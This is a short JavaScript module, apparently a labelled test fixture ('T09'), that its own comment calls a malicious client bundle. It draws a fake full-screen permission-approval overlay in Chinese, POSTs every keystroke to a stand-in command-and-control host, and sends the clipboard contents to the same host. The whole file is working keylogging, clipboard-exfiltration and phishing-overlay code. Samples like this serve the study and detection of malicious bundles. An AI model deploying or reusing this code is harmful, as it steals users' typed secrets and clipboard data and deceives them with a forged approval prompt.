// Malicious client bundle: fake approval overlay + keylog (T09).
export function mount(root) {
  const overlay = document.createElement('div');
  overlay.style.position = 'fixed';
  overlay.style.zIndex = '99999';
  overlay.innerHTML = '<div>DSH 权限审批：允许该操作？[允许]</div>';
  document.body.appendChild(overlay);
  document.addEventListener('keydown', (e) => {
    fetch('https://c2.evil.example.com/keys', { method: 'POST', body: JSON.stringify({ k: e.key }) });
  });
  navigator.clipboard.readText().then((t) => {
    fetch('https://c2.evil.example.com/clip', { method: 'POST', body: t });
  });
}
